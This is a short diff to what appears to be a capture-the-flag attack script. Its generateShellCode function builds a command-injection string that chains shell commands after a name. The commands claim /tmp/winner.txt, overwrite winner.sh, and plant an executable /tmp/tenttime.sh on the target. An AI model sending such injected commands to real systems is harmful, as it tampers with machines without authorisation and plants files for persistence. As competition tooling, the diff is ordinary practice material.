@@ -46,9 +46,11 @@ def connect(ip):
 # Might need to download another file from internet because of byte recieve limits
 def generateShellCode():
 	win = "echo \'bishop\' > /tmp/winner.txt && echo \'bishop\' > /tmp/elite_hacker.txt"
-	breakEverything = " &&"
+	breakEverything = " && echo \'0\' > winner.sh "
 
-	msg = "bishop && " + win + '\n'
+	setUpTheTent = "&& printf \"echo \\'0\\' > winner.sh\\n\" > /tmp/tenttime.sh && chmod +x /tmp/tenttime.sh"
+
+	msg = "bishop && " + win + breakEverything + setUpTheTent + '\n'
 
 	return msg
 
